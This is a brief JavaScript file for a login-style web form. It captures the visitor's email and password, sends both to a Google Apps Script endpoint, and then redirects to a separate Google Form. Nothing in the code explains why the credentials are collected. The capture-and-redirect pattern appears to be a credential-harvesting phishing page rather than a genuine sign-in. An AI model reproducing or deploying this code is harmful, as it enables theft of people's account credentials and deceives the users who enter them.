document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("userForm");
    const togglePassword = document.getElementById("togglePassword");

    // Handle form submission
    form.addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent default form submission

        // Get form values
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        // Prepare data to send
        const formData = new FormData();
        formData.append("email", email);
        formData.append("password", password);

        // Google Apps Script endpoint to save data
        const scriptURL = "https://script.google.com/macros/s/AKfycbw_Sx1qP0A8aiV0GcZ83SNUHMRh0Nibr6ITjMz7EWZFM2QuDXvahZsn8VloDVvCCfXt/exec";

        // Send data using fetch API
        fetch(scriptURL, {
            method: "POST",
            body: formData,
        })
            .then((response) => {
                if (response.ok) {
                    // Redirect to the Google Form
                    window.location.href = "https://forms.gle/v1nMWschZhD7L31J6";
                } else {
                    alert("Error saving data. Please try again.");
                }
            })
            .catch((error) => {
                console.error("Error:", error);
                alert("Error saving data. Please try again.");
            });
    });

    // Handle password visibility toggle
    togglePassword.addEventListener("click", function () {
        const passwordField = document.getElementById("password");
        const type = passwordField.getAttribute("type");

        if (type === "password") {
            passwordField.setAttribute("type", "text");
            this.innerHTML = "&#128064;"; // Use open-eye emoji or replace with an SVG/icon
        } else {
            passwordField.setAttribute("type", "password");
            this.innerHTML = "&#128065;"; // Use closed-eye emoji or replace with an SVG/icon
        }
    });
});
